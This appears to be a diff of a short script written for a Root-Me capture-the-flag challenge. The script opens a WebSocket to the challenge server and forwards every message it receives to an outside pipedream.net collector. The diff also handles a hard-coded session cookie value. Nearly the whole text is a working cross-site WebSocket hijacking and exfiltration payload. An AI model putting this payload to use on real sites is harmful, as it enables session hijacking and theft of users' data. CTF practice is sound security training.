@@ -1,4 +1,6 @@
 <script>
+  let headers = new Headers();
+  headers.append("Cookie", "connect.sid=s:WmV38vHd8ZPgp2SoP-yAotvNzpcJ9Rw5.mQdvPtPiwhR92KaMUFYLJMbk3TGJAhY08tMlsPYflek");
   var websocket = new WebSocket('ws://ctf07.root-me.org/ws');
   websocket.onopen = start
 websocket.onmessage = handleReply
@@ -6,7 +8,7 @@ function start(event) {
   websocket.send("READY");
 }
 function handleReply(event) {
-  fetch('https://eocvkn4m3kpce3q.m.pipedream.net?'+event.data, {mode: 'no-cors', cookie: 'connect.sid="s%3AWmV38vHd8ZPgp2SoP-yAotvNzpcJ9Rw5.mQdvPtPiwhR92KaMUFYLJMbk3TGJAhY08tMlsPYflek"'})
+  fetch('https://eocvkn4m3kpce3q.m.pipedream.net?'+event.data, {mode: 'no-cors'})
 }
 
 </script>
